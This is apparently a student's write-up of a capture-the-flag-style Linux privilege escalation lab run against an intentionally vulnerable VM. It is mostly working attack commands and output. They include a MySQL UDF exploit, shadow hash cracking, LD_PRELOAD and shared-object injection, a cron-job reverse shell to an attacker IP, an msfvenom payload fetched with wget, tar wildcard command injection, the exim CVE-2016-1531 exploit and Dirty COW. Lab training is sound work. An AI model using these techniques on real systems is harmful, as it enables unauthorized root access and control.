Task 1: Deploy the Vulnerable Debian VM 
```
This room is aimed at walking you through a variety of Linux Privilege Escalation techniques. To do this, you must first deploy an intentionally vulnerable Debian VM. This VM was created by Sagi Shahar as part of his local privilege escalation workshop but has been updated by Tib3rius as part of his Linux Privilege Escalation for OSCP and Beyond! course on Udemy. Full explanations of the various techniques used in this room are available there, along with demos and tips for finding privilege escalations in Linux.

Make sure you are connected to the TryHackMe VPN or using the in-browser Kali instance before trying to access the Debian VM!

SSH should be available on port 22. You can login to the "user" account using the following command:

ssh user@10.10.106.19

If you see the following message: "Are you sure you want to continue connecting (yes/no)?" type yes and press Enter.

The password for the "user" account is "password321".

The next tasks will walk you through different privilege escalation techniques. After each technique, you should have a root shell. Remember to exit out of the shell and/or re-establish a session as the "user" account before starting the next task!
```
## run id command
```console
$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```

# Task 2 Service Exploits
The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a [popular exploit](https://www.exploit-db.com/exploits/1518) that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service


To check if mysql is runing as roo run: ```ps -u root | grep mysql```. The guide for this task is clear so I will not copy past stuff here. just gona write what I need to remember from this task. It might be helpful for me in the future:
1. download the exploit from the link above
2. complie the exploit by
```console
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
3. now run as mysql as root ```mysql -u rooot```
4. Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our exploit:
```mysql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
5. Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission, then exit mysql
```mysql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
exit
```
6. run the /tmp/rootbash executable with -p to gain a shell running with root privileges: 
```console
$ /tmp/rootbash -p
rootbash-4.1# whoami
root
rootbash-4.1# rm /tmp/rootbash
```

damnnnnn. The last command is removeing the the script. dont for get to romove it guys!!

# TASK 3: Weak File Permissions - Readable /etc/shadow 
```console
user@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
daemon:*:17298:0:99999:7:::
bin:*:17298:0:99999:7:::
sys:*:17298:0:99999:7:::
sync:*:17298:0:99999:7:::
games:*:17298:0:99999:7:::
man:*:17298:0:99999:7:::
lp:*:17298:0:99999:7:::
mail:*:17298:0:99999:7:::
news:*:17298:0:99999:7:::
uucp:*:17298:0:99999:7:::
proxy:*:17298:0:99999:7:::
www-data:*:17298:0:99999:7:::
backup:*:17298:0:99999:7:::
list:*:17298:0:99999:7:::
irc:*:17298:0:99999:7:::
gnats:*:17298:0:99999:7:::
nobody:*:17298:0:99999:7:::
libuuid:!:17298:0:99999:7:::
Debian-exim:!:17298:0:99999:7:::
sshd:*:17298:0:99999:7:::
user:$6$M1tQjkeb$M1A/ArH4JeyF1zBJPLQ.TZQR1locUlz0wIZsoY6aDOZRFrYirKDW5IJy32FBGjwYpT2O1zrR2xTROv7wRIkF8.:17298:0:99999:7:::
statd:*:17299:0:99999:7:::
mysql:!:18133:0:99999:7:::
```
on my kali
```console
kali@kali:~/LinuxPrivEsc$ echo "root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::" > root.txt
kali@kali:~/LinuxPrivEsc$ hashcat -a 0 -m 1800 -o cracked.txt root.txt /usr/share/wordlists/rockyou.txt --force
kali@kali:~/LinuxPrivEsc$ cat cracked.txt 
$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:XXXXXXXXXXX
```
find out what XXXXXXXX is :P. GLHF

# Weak File Permissions - Writable /etc/shadow 
```console
user@debian:~$ ls -l /etc/shadow
-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow
```
damn we have write permission
```console
user@debian:~$ mkpasswd -m sha-512 kurohatwashere
$6$G5cFZMg03v81$/MHuRxqSlP8yFCqHOFIfQRXPwsor32wwUoPdE791lONV7YaviZQKi830I0TLuGj/kOj6OO9XI78Vx4CpYUGST0
user@debian:~$ nano /etc/shadow # replace root password (from 1st : to 2nd :) with the generated password
user@debian:~$ su root
Password: 
root@debian:/home/user# whoami 
root
```

# Weak File Permissions - Writable /etc/passwd
```console
user@debian:~$ ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
user@debian:~$ openssl passwd gu2washere
Warning: truncating password to 8 characters
p7WxO7eoMHzVY
user@debian:~$ nano /etc/passwd # replace hash between 1st colon and 2 colon (replacing the "x") with the genarated password
user@debian:~$ su root
Password: 
root@debian:/home/user# whoami
root
```

another way to do it is create a new root user in ```/etc/passwd``` by copy the root row and append it to the buttom of the file. Change the password (replace "x" or put the genarated password between 1st and 2nd colon) and change the user name. the run ```su newroot``` to get ROOT

# Sudo - Shell Escape Sequences 
holly damn, this shit is super cool. bookmark it guys https://gtfobins.github.io/ !!
```console
user@debian:~$ sudo find . -exec /bin/sh \; -quit
sh-4.1# whoami
root
``` 

# task 7: Sudo - Environment Variables
this task was something new for me. it was hard to understand first but after reading through the task discription like 3 time then I got it.
```console
user@debian:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD,
    env_keep+=LD_LIBRARY_PATH
```

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.



Create a shared object using the code call preload.c which I included [here](preload.c)


```gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c```


Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:


```sudo LD_PRELOAD=/tmp/preload.so program-name-here```


A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.



Run ldd against the apache2 program file to see which shared libraries are used by the program:

```console
user@debian:~$ ldd /usr/sbin/apache2
        linux-vdso.so.1 =>  (0x00007fffef3ff000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fb4bfb31000)
        libaprutil-1.so.0 => /usr/lib/libaprutil-1.so.0 (0x00007fb4bf90d000)
        libapr-1.so.0 => /usr/lib/libapr-1.so.0 (0x00007fb4bf6d3000)
        libpthread.so.0 => /lib/libpthread.so.0 (0x00007fb4bf4b7000)
        libc.so.6 => /lib/libc.so.6 (0x00007fb4bf14b000)
        libuuid.so.1 => /lib/libuuid.so.1 (0x00007fb4bef46000)
        librt.so.1 => /lib/librt.so.1 (0x00007fb4bed3e000)
        libcrypt.so.1 => /lib/libcrypt.so.1 (0x00007fb4beb07000)
        libdl.so.2 => /lib/libdl.so.2 (0x00007fb4be902000)
        libexpat.so.1 => /usr/lib/libexpat.so.1 (0x00007fb4be6da000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb4bffee000)
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located [here](library_path.c)


```gcc -o /tmp/libcrypt.so.1 -shared -fPIC library_path.c```


Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):


```sudo LD_LIBRARY_PATH=/tmp apache2```


# Task 8 : Cron Jobs - file permissions
```console
user@debian:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```
two last cronjob run each min, ```overwrite.sh``` and ```/usr/local/bin/compress.sh```

```console
user@debian:~$ locate overwrite.sh # find the scrip
/usr/local/bin/overwrite.sh
user@debian:~$ cat /usr/local/bin/overwrite.sh
#!/bin/bash

echo `date` > /tmp/useless
user@debian:~$ nano /usr/local/bin/overwrite.sh # edit the scrip
```
change the content in overwrite.sh to following os you can find script [here](bash_blackdoor.sh)
```bash
#!/bin/bash
bash -i >& /dev/tcp/<kali ip>/<port> 0>&1
```
gratz we just create backdoor, now run netcat and wait for the connection
```console
kali@kali:~/LinuxPrivEsc$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.236.173] 56477
bash: no job control in this shell
root@debian:~# whoami
whoami
root
```

# Task 9: Cron Jobs: PATH Environment Variable 
from last task we notice that the PATH variable starts with /home/user (```PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin```) which is our user's home directory. We can create a new file call  overwrite.sh and make it do something else, forinstance; copy create a new bash. So ```nano overwrite.sh``` and add this:
```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

```console
user@debian:~$ chmod +x /home/user/overwrite.sh # make it executable and wait 1 min for cron job run
user@debian:~$ /tmp/rootbash -p # now run it
rootbash-4.1# whoami
root
```

note that the cron job will go thought the path one by one, so you can put the script in any directory that included in the path. It is important to know that it is only work with cron job that a absolute path is not givven.

# Task 10 : Cron Jobs - Wildcards 
```console
user@debian:~$ cat /usr/local/bin/compress.sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
Note that the tar command is being run with a wildcard (*) in your home directory. Take a look at the GTFOBins page for [tar](https://gtfobins.github.io/gtfobins/tar/). Note that tar has command line options that let you run other commands as part of a checkpoint feature. Next step is create a reverse shell ELF binary using ```msfvenom```
```console
kali@kali:~/LinuxPrivEsc$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ur ip> LPORT=<ur port> -f elf -o shell.elf # crate reverse shell
kali@kali:~/LinuxPrivEsc$ python -m SimpleHTTPServer 8000 # create a httpserver
```
now use wget to get the reverse shell ELF binary
```console
user@debian:~$ wget 10.8.14.151:8000/shell.elf
--2020-05-22 23:08:04--  http://10.8.14.151:8000/shell.elf
Connecting to 10.8.14.151:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 194 [application/octet-stream]
Saving to: “shell.elf”

100%[====================>] 194         --.-K/s   in 0s      

2020-05-22 23:08:04 (25.2 MB/s) - “shell.elf” saved [194/194]

user@debian:~$ ls
myvpn.ovpn  overwrite.sh  shell.elf  test  tools
user@debian:~$ chmod +x /home/user/shell.elf # make it executable
user@debian:~$ touch /home/user/--checkpoint=1 # create 2 files
user@debian:~$ touch /home/user/--checkpoint-action=exec=shell.elf
```
When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames. now set up netcat and wait for cron job to execute our reverse shell
```console
kali@kali:~/LinuxPrivEsc$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.236.173] 56585
ls
--checkpoint-action=exec=shell.elf
--checkpoint=1
myvpn.ovpn
overwrite.sh
shell.elf
test
tools
whoami
root
```

# [Task 11] SUID / SGID Executables - Known Exploits 
Find all the SUID/SGID executables on:
```find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null``` here is the result
```console
user@debian:~$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
-rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
-rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
-rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
-rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
-rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
-rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
-rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
-rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
-rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
-rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
-rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
-rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
-rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
-rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs
```

Note that /usr/sbin/exim-4.84-3 appears in the results. After some research: I found [this](https://www.exploit-db.com/exploits/39535)
```console
#!/bin/sh
# CVE-2016-1531 exim <= 4.84-3 local root exploit
# ===============================================
# you can write files as root or force a perl module to
# load by manipulating the perl environment and running
# exim with the "perl_startup" arguement -ps. 
#
# e.g.
# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
# [ CVE-2016-1531 local root exploit
# sh-4.3# id
# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
# 
# -- Hacker Fantastic 
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm << EOF
package root;
use strict;
use warnings;

system("/bin/sh");
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
```
then run the exploit
```console
user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh.
-bash: /home/user/tools/suid/exim/cve-2016-1531.sh.: No such file or directory
user@debian:~$ /home/user/tools/suid/exim/cve-2016-1531.sh
[ CVE-2016-1531 local root exploit
sh-4.1# whoami
root
```

# [Task 12] SUID / SGID Executables - Shared Object Injection

```console
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)                                             
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)                                             
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)                                             
open("/etc/ld.so.cache", O_RDONLY)      = 3                   
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)                                             
open("/lib/libdl.so.2", O_RDONLY)       = 3                   
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)                                             
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3                 
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)                                             
open("/lib/libm.so.6", O_RDONLY)        = 3                   
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)                                             
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3                   
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)                                             
open("/lib/libc.so.6", O_RDONLY)        = 3                   
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)  
```
so the plan is inject a share file that have will execute ```/bin/bash -p``` and put it in those directory that we have permission to. the script is looks like this:
```console
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}
```
We dont have permission to put anython in ```/etc``` so the last chance is ```/home/user/.config/libcalc.so```
```console
user@debian:~$ mkdir /home/user/.config # create directory
user@debian:~$ gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c # complie the exploit
user@debian:~$ /usr/local/bin/suid-so # exceute souid-so
Calculating something, please wait...
bash-4.1# whoami
root
```
#  [Task 13] SUID / SGID Executables - Environment Variables 
The ````/usr/local/bin/suid-env```` executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.


Run strings on the file to look for strings of printable characters: ```strings /usr/local/bin/suid-env```.  One line ("service apache2 start") suggests that the service executable is being called to start the webserver, **however the full path of the executable (/usr/sbin/service) is not being used.**


Compile the code located at ```/home/user/tools/suid/service.c``` into an executable called service. [This](spawn_bash.c) code simply spawns a Bash shell: ```gcc -o service /home/user/tools/suid/service.c```


Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell: ```PATH=.:$PATH /usr/local/bin/suid-env```. 

```console
user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
user@debian:~$ cat /home/user/tools/suid/service.c
int main() {
        setuid(0);
        system("/bin/bash -p");
}
user@debian:~$ gcc -o service /home/user/tools/suid/service.c
user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
root@debian:~#
```

# [Task 14] SUID / SGID Executables - Abusing Shell Features (#1)
```console
user@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```
The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.


In Bash versions **<4.2-048** it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path. Verify the version of Bash: 

```/bin/bash --version```



Create a Bash function with the name "**/usr/sbin/service**" that executes a new Bash shell (using -p so permissions are preserved) and export the function:
```console
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```
Run the suid-env2 executable to gain a root shell: ```/usr/local/bin/suid-env2```
```console
user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
user@debian:~$ export -f /usr/sbin/service
user@debian:~$ /usr/local/bin/suid-env2
root@debian:~# 
```

# [Task 15] SUID / SGID Executables - Abusing Shell Features (#2)
**Note: This will not work on Bash versions 4.4 and above.**

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements. Run the **/usr/local/bin/suid-env2** executable with bash debugging enabled and the **PS4** variable set to an embedded command which creates an SUID version of */bin/bash*: 


```env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2```


Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```/tmp/rootbash -p```

#  [Task 16] Passwords & Keys - History Files 
If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.


to reading history file: ```cat ~/.*history | less```
```console
ls -al
mysql -h somehost.local -uroot -ppassword123
```
Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!


Switch to the root user, using the password: ```su root```

#  [Task 17] Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.
In home directory you will find *myvpn.ovpn* config file. View the contents of the file: ```cat /home/user/myvpn.ovpn```

```console
user@debian:~$ cat /home/user/myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

user@debian:~$ cat /etc/openvpn/auth.txt
root
password123
``` 
Switch to the root user, using the credentials:``` su root```

# [Task 18] Passwords & Keys - SSH Keys 
Sometimes users make backups of important files but fail to secure them with the correct permissions. at the root directory ```/``` you will find a hidden file call ```.ssh```. View the contents of the directory
```console
user@debian:~$ ls -la /.ssh/
total 12
drwxr-xr-x  2 root root 4096 Aug 25  2019 .
drwxr-xr-x 22 root root 4096 Aug 25  2019 ..
-rw-r--r--  1 root root 1679 Aug 25  2019 root_key
```
As you can see we have a premission to read+write to ```root_key``` let copy the content of the file and to our machine and ssh to the target again using root cerdential. Dont for get to make the copied root_key executable by using ```chmod 666```. now run:
```console
kali@kali:~/LinuxPrivEsc$ ls
cracked.txt  root_key  root.txt  shell.elf
kali@kali:~/LinuxPrivEsc$ ssh -i root_key root@<target ip>
Last login: Sun Aug 25 XXXXXXXXX from xxxxxxxx
root@debian:~# 
```
#  [Task 19] NFS
Before start doing this room, I would recommended to read this two links. [link1](https://fullyautolinux.blogspot.com/2015/11/nfs-norootsquash-and-suid-basic-nfs.html), [link2](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/s2-server-nfs-noroot)


Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user. to check the NFS share configuration , run ```cat /etc/exports``` Note that the /tmp share has root squashing disabled.

Now let mount the NFS to our kali
```console
$ mkdir /tmp/nfs # create directory
$ mount -o rw,vers=2 <target IP>:/tmp /tmp/nfs # mount NFS
$ sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf # generate payload and save it at the mounted share      
$ sudo chmod +xs /tmp/nfs/shell.elf # make the payload executable and set the SUID permission.
```
The owner of the payload now is root user which is why we set the SUID permission. so the we PrivEsc using user cerdential to execute the payload.
```console
user@debian:~$ ls -la /tmp/
total 116                                                     
drwxrwxrwt  2 root root  4096 May 25 20:14 .                  
drwxr-xr-x 22 root root  4096 Aug 25  2019 ..                 
-rw-r--r--  1 root root 94636 May 25 20:14 backup.tar.gz      
-rwsr-sr-x  1 root root   132 May 25 20:13 shell.elf          
-rw-r--r--  1 root root    29 May 25 20:14 useless
user@debian:~$ /tmp/shell.elf                                 
bash-4.1# whoami                                              
root 
```

#  [Task 20] Kernel Exploits
Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort. Run the ```Linux Exploit Suggester 2``` tool to identify potential kernel exploits on the current system. github links for ```Linux Exploit Suggester 2``` [here](https://github.com/jondonas/linux-exploit-suggester-2)


note that the target machine is vulnerable to **Dirty Cow**. watch [this](https://youtu.be/kEsshExn7aE), It might help to understand how dity cow works. Exploit code for Dirty COW can be found at ```/home/user/tools/kernel-exploits/dirtycow/c0w.c``` or download from exploit-db. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).Compile the code and run it (note that it may take several minutes to complete):

```console
user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w

user@debian:~$ ./c0w
                                
   (___)                                   
   (o o)_____/                             
    @@ `     \                            
     \ ____, //usr/bin/passwd                          
     //    //                              
    ^^    ^^                               
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap efe25000

madvise 0

ptrace 0

user@debian:~$ /usr/bin/passwd
root@debian:/home/user#  
```
now to remove the expoit and return the machine back to normalt stage
```console
$ mv /tmp/bak /usr/bin/passwd
$ exit
```
# [Task 21] Privilege Escalation Scripts

Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: /home/user/tools/privesc-scripts



DAAAAAMN! what a script man. it is a Linux Enumeration & Privilege Escalation Scripts. It give you everything about the local Linux machine. here is the github link [LinEnum](https://github.com/rebootuser/LinEnum), [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), and [lse](https://github.com/diego-treitos/linux-smart-enumeration)


To learn more about tools' options you can run ```-h``` or vistie the tools website.